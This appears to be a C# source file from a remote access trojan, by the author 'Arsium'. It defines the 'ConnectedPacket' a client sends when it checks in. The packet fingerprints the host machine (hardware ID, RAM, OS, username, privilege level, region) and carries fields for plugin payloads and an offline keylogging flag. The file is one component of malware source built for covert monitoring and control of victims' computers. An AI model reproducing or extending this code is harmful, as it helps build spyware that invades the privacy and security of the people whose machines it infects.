using PacketLib.Utils;
using System;
using System.Globalization;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ConnectedPacket : IPacket
    {
        //client
        public ConnectedPacket() : base()
        {
            Plugin = null;
            Microsoft.VisualBasic.Devices.Computer I = new Microsoft.VisualBasic.Devices.Computer();
            PacketType = PacketType.CONNECTED;
            Native.GetPhysicallyInstalledSystemMemory(out long lRam);
            RAM = string.Format("{0}Gb", (ulong)((double)lRam / 1024d / 1024d));
            HWID = HwidGen.HWID();
            Is64Bit = Miscellaneous.Check64Bit();
            Privilege = Miscellaneous.Privilege();
            OSName = I.Info.OSFullName;
            Username = Environment.UserName;
            RegionName = RegionInfo.CurrentRegion.Name + " - " + RegionInfo.CurrentRegion.EnglishName;
            RegionFlag = RegionInfo.CurrentRegion.Name.ToLower();
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string RAM { get; }
        public string Is64Bit { get; }
        public string Privilege { get; }
        public string OSName { get; }
        public string Username { get; }
        public string RegionName { get; }
        public string RegionFlag { get; }
        public bool keylogOffline { get; set; }
        public string sigKey { get; set; }
    }
}
